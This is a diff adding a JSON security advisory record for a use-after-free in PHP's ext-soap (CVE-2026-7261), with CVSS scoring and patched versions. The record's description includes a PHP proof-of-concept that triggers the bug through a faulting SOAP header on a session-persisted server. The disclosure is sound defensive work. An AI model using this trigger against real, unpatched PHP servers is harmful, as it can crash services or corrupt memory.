@@ -1,0 +1,72 @@
+{
+  "global": null,
+  "id": "GHSA-m33r-qmcv-p97q",
+  "repo": {
+    "cve_id": "CVE-2026-7261",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 6.3,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [],
+    "description": "`SOAP_PERSISTENCE_SESSION` allows to persist the SOAP handler object between requests using the session storage. Normally the object is immediately released after `SoapServer::handle()`, unless this setting is specified. This differentiation happens with the `service->soap_class.persistence != SOAP_PERSISTENCE_SESSION` check. `soap.c` fails to account for this flag in two places: \r\n\r\nhttps://github.com/php/php-src/blob/0d9ff00394d9447992bb66ccb1cef3edf70576bd/ext/soap/soap.c#L1595\r\n\r\nhttps://github.com/php/php-src/blob/0d9ff00394d9447992bb66ccb1cef3edf70576bd/ext/soap/soap.c#L1600\r\n\r\nBoth of them are failure cases when a handler function for a header node either returned `false` or threw an exception. When the session is written, the freed object will be read and written to the session storage, resulting in a use-after-free. Normally, a SOAP server will only handle one SOAP request per PHP request, so it's unlikely that the attacker will be able to control the freed memory segment, though it is not impossible.\r\n\r\nThe following example demonstrates the use-after-free.\r\n\r\n```php\r\nclass SoapSrv {\r\n    public function return()  {\r\n        return new SoapFault('Server', 'denied');\r\n    }\r\n    public function hello() {\r\n        return 'ok';\r\n    }\r\n}\r\n\r\nsession_start();\r\n\r\n$srv = new SoapServer(null, ['uri' => 'urn:a']);\r\n$srv->setClass('SoapSrv');\r\n$srv->setPersistence(SOAP_PERSISTENCE_SESSION);\r\n\r\n$srv->handle(<<<XML\r\n<?xml version=\"1.0\"?>\r\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:a=\"urn:a\">\r\n  <soap:Header>\r\n    <a:return/>\r\n  </soap:Header>\r\n  <soap:Body>\r\n    <a:hello/>\r\n  </soap:Body>\r\n</soap:Envelope>\r\nXML);\r\n```",
+    "ghsa_id": "GHSA-m33r-qmcv-p97q",
+    "html_url": "https://github.com/php/php-src/security/advisories/GHSA-m33r-qmcv-p97q",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-m33r-qmcv-p97q"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-7261"
+      }
+    ],
+    "published_at": "2026-05-07T12:57:35Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "SoapServer session-persisted object use-after-free via SOAP header fault",
+    "updated_at": "2026-05-07T12:57:35Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.2.31",
+        "vulnerable_version_range": "< 8.2.31"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.3.31",
+        "vulnerable_version_range": "< 8.3.31"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.4.21",
+        "vulnerable_version_range": "< 8.4.21"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.5.6",
+        "vulnerable_version_range": "< 8.5.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "php/php-src"
+}
